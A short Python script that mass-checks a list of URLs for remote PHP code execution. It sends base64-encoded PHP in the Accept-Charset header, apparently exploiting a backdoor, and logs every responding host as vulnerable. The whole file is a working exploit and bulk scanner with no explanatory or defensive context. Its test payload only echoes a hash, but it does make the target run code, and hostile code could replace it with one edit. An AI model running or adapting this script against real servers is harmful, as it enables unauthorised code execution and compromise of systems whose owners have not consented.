import base64
import requests

def checkTarget(url):
    import hashlib
    import random
    TIME_OUT = 10
    s= str(random.random())
    m = hashlib.md5()
    b = s.encode(encoding='utf-8')
    m.update(b)
    s_md5 = m.hexdigest()
    s = "echo(md5('{0}'));".format(s)
    poc = base64.b64encode(s.encode('utf-8'))

    poc = {
        "Accept-Charset": poc,
        "Accept-Encoding": "gzip,deflate"
    }
    try:
        pocRequest = requests.get(url, headers=poc,timeout=TIME_OUT)
        if s_md5 in str(pocRequest.content):
            print('[+] Target is vulnerable.'+url)
            return True
        else:
            print('[-] Target is NOT vulnerable.'+url)
            return False
    except :
        print('[-] Looks Like Something Wrong.'+url)

def main():
    f = open("url.txt",'r')
    f1 = open ("res.txt",'w')
    for line in f.readlines():
        url = line
        re = checkTarget(url)
        if re:
            f1.write(url)
    f.close()
    f1.close()
if __name__ == '__main__':
    main()
